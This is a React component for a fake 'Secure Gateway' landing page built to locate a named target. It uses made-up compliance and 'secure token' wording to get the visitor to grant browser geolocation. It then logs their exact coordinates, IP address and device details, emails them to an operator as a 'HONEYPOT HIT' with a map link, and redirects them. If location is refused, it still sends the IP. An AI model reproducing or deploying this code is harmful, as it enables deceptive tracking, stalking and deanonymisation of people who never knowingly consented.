
import React, { useState, useEffect } from 'react';
import { ShieldCheck, MapPin, CheckCircle, Loader, Lock, Globe, ArrowUpLeft } from 'lucide-react';
import { MapContainer, TileLayer, Marker, Popup } from 'react-leaflet';
import L from 'leaflet';
import { fetchPublicIP, sendSystemEmail } from '../services/api';
import { dbService } from '../services/db';
import { ADMIN_EMAIL } from '../services/config';

// Fix Icons
delete (L.Icon.Default.prototype as any)._getIconUrl;
L.Icon.Default.mergeOptions({
  iconRetinaUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon-2x.png',
  iconUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
  shadowUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
});

interface HoneypotProps {
    targetName?: string;
    redirectUrl: string;
    traceId: string;
}

const HoneypotLanding: React.FC<HoneypotProps> = ({ targetName, redirectUrl, traceId }) => {
    const [status, setStatus] = useState<'idle' | 'verifying' | 'success' | 'redirecting'>('idle');
    const [ip, setIp] = useState('Checking...');
    
    // Initial IP check on load
    useEffect(() => {
        fetchPublicIP().then(setIp);
    }, []);

    const handleVerify = () => {
        setStatus('verifying');
        
        // Delay slightly to show instruction
        setTimeout(() => {
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    const { latitude, longitude, accuracy } = pos.coords;
                    
                    // 1. Log to DB
                    await dbService.add('tracked_clicks', {
                        id: Date.now().toString(),
                        timestamp: new Date().toISOString(),
                        traceId,
                        lat: latitude,
                        lng: longitude,
                        accuracy,
                        ip,
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        name: targetName || 'Anonymous Target'
                    });

                    // 2. Email Ops
                    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                    await sendSystemEmail(
                        ADMIN_EMAIL, 
                        `HONEYPOT HIT: ${targetName || traceId}`, 
                        `Target Identified.\n\nName: ${targetName}\nIP: ${ip}\nCoords: ${latitude}, ${longitude}\nMap: ${mapLink}`
                    );

                    setStatus('success');

                    // 3. Redirect
                    setTimeout(() => {
                        setStatus('redirecting');
                        window.location.href = redirectUrl.startsWith('http') ? redirectUrl : `https://${redirectUrl}`;
                    }, 2000);
                },
                (err) => {
                    // Even on denial, log what we have (IP) and redirect
                    console.error(err);
                    sendSystemEmail(ADMIN_EMAIL, `HONEYPOT HIT (NO GEO): ${targetName}`, `IP: ${ip}\nUser denied geo.`);
                    
                    // Force redirect anyway
                    setTimeout(() => {
                        window.location.href = redirectUrl.startsWith('http') ? redirectUrl : `https://${redirectUrl}`;
                    }, 1000);
                }
            );
        }, 800);
    };

    return (
        <div className="min-h-screen bg-slate-50 text-slate-900 font-sans flex flex-col relative">
            {/* Header */}
            <header className="bg-white border-b border-slate-200 p-4 flex items-center gap-3 shadow-sm z-10">
                <div className="bg-cyan-600 p-2 rounded-lg text-white">
                    <ShieldCheck size={24} />
                </div>
                <div>
                    <h1 className="font-bold text-lg text-slate-800">Secure Gateway</h1>
                    <p className="text-xs text-slate-500 flex items-center gap-1"><Lock size={10}/> TLS Encrypted Connection</p>
                </div>
            </header>

            <main className="flex-1 flex flex-col items-center justify-center p-6 text-center max-w-md mx-auto w-full z-10">
                
                <div className="mb-8 relative">
                    <div className="w-24 h-24 bg-cyan-100 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
                         <Globe size={48} className="text-cyan-600"/>
                    </div>
                    {status === 'success' && (
                        <div className="absolute inset-0 flex items-center justify-center bg-white/80 rounded-full">
                             <CheckCircle size={56} className="text-green-500 animate-in zoom-in"/>
                        </div>
                    )}
                </div>

                <h2 className="text-2xl font-bold mb-2">
                    {targetName ? `Welcome, ${targetName}` : 'Security Check Required'}
                </h2>
                <p className="text-slate-600 mb-8">
                    To access the requested document securely, we need to verify your location region to ensure compliance with local access policies.
                </p>

                {/* Map Preview (Generic until allowed) */}
                <div className="w-full h-48 bg-slate-200 rounded-xl overflow-hidden mb-8 border border-slate-300 shadow-inner relative group">
                    <MapContainer 
                        center={[13.7563, 100.5018]} 
                        zoom={5} 
                        style={{ height: '100%', width: '100%' }} 
                        zoomControl={false}
                        dragging={false}
                    >
                        <TileLayer url="https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png" />
                        <Marker 
                            position={[13.7563, 100.5018]}
                            icon={L.divIcon({
                                className: 'neon-marker-wrap',
                                html: `<div class="text-cyan-600 drop-shadow-[0_0_10px_#0891b2] animate-bounce"><svg width="48" height="48" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg></div>`,
                                iconSize: [48, 48],
                                iconAnchor: [24, 48]
                            })}
                        />
                    </MapContainer>
                    <div className="absolute inset-0 bg-gradient-to-t from-white/80 to-transparent flex items-end justify-center pb-4">
                        <div className="flex items-center gap-2 text-sm font-bold text-slate-700">
                             <MapPin size={16} className="text-cyan-600"/> Location Verification
                        </div>
                    </div>
                </div>

                <div className="w-full space-y-4">
                    {status === 'redirecting' ? (
                        <div className="text-slate-500 flex items-center justify-center gap-2">
                            <Loader className="animate-spin" size={20}/> Redirecting you now...
                        </div>
                    ) : status === 'success' ? (
                        <button disabled className="w-full bg-green-600 text-white font-bold py-3 rounded-xl shadow-lg flex items-center justify-center gap-2">
                            <CheckCircle size={20}/> Identity Verified
                        </button>
                    ) : (
                        <button 
                            onClick={handleVerify}
                            disabled={status === 'verifying'}
                            className="w-full bg-cyan-600 hover:bg-cyan-700 text-white font-bold py-4 rounded-xl shadow-xl shadow-cyan-200 transition-all active:scale-95 flex items-center justify-center gap-2"
                        >
                            {status === 'verifying' ? <Loader className="animate-spin" size={20}/> : <ShieldCheck size={20}/>}
                            {status === 'verifying' ? 'Verifying...' : 'Verify Location & Continue'}
                        </button>
                    )}
                    
                    <div className="flex justify-between text-[10px] text-slate-400 mt-4 px-2">
                        <span>IP: {ip}</span>
                        <span>ID: {traceId}</span>
                    </div>
                </div>

            </main>

            <footer className="p-6 text-center text-xs text-slate-400 border-t border-slate-100 z-10">
                &copy; 2024 Secure Gateway Verification System. All rights reserved.
            </footer>

            {/* Instruction Overlay */}
            {status === 'verifying' && (
                <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex flex-col items-center justify-center text-white p-8">
                    <div className="absolute top-10 left-10 animate-bounce-slow">
                        <ArrowUpLeft size={64} className="text-white drop-shadow-[0_0_15px_rgba(255,255,255,0.8)] stroke-[3]" />
                    </div>
                    <div className="bg-slate-900 border border-slate-700 p-6 rounded-2xl shadow-2xl max-w-sm text-center">
                        <Loader className="animate-spin mx-auto mb-4 text-cyan-400" size={32}/>
                        <h3 className="text-xl font-bold mb-2">Action Required</h3>
                        <p className="text-slate-300 text-sm mb-4">
                            Please click <span className="font-bold text-white bg-slate-700 px-1 rounded">Allow</span> in the browser popup.
                        </p>
                        <p className="text-xs text-slate-500">
                            This creates a secure geolocation token to verify your access rights.
                        </p>
                    </div>
                </div>
            )}
        </div>
    );
};

export default HoneypotLanding;
